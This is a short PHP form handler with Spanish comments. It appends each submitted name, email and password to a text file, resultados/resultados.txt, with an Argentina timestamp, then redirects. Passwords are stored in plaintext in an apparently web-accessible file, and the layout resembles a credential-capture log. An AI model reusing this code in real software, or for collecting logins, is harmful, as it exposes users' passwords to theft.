<?php
function isEmailRegistered($email) {
    $archivo = 'resultados/resultados.txt';
    $emails = file_get_contents($archivo);
    $emailsList = explode("\n", $emails);
    foreach ($emailsList as $registeredEmail) {
        $data = explode(":", $registeredEmail);
        if (isset($data[1]) && trim($data[1]) === trim($email)) {
            return true;
        }
    }
    return false;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $contrasena = htmlspecialchars($_POST['contrasena']);

    // Validar que el email no esté registrado
    if (isEmailRegistered($email)) {
        // El email ya está registrado, redirigir a index.php con mensaje de error
        header('Location: index.php?error=El+email+ingresado+ya+está+registrado.+Por+favor,+ingresa+otro+email.');
        exit;
    }    

    // Configurar el huso horario para Argentina
    date_default_timezone_set('America/Argentina/Buenos_Aires');
    
    // Guardar los datos en el archivo resultados.txt
    $archivo = 'resultados/resultados.txt';
    $contenido = "Fecha y Hora en Argentina: " . date("Y-m-d h:i:s A") . "\n";
    $contenido .= "Nombre: " . $nombre . "\n";
    $contenido .= "Email: " . $email . "\n";
    $contenido .= "Contraseña: " . $contrasena . "\n"; 
    $contenido .= "--------------------------------------------------------------\n";
    file_put_contents($archivo, $contenido, FILE_APPEND);

    // Redireccionar a la página de confirmación
    header('Location: confirmacion.html');
    exit;
}

?>
